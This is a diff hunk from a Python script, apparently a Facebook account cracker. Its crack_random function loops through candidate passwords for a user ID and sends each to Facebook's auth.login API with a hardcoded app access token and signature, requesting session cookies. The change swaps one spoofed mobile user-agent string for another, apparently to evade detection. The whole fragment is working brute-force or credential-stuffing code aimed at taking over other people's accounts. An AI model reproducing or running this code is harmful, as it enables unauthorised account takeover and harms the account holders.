@@ -846,7 +846,7 @@ def crack_random():
 		try:
 			for pw in pwx:
 				pw = pw.lower()
-				ua_api = random.choice(['SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)'])
+				ua_api = random.choice(['Mozilla/5.0 (Linux; ARMv7; Android 4.1.1; fr-fr; SonyEricsson Xperia E; rv 21.0) Gecko/20130514 Mobile Firefox/21.0'])
 				params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 				api = 'https://b-api.facebook.com/method/auth.login'
 				response = requests.get(api, params=params, headers={'user-agent': ua_api})
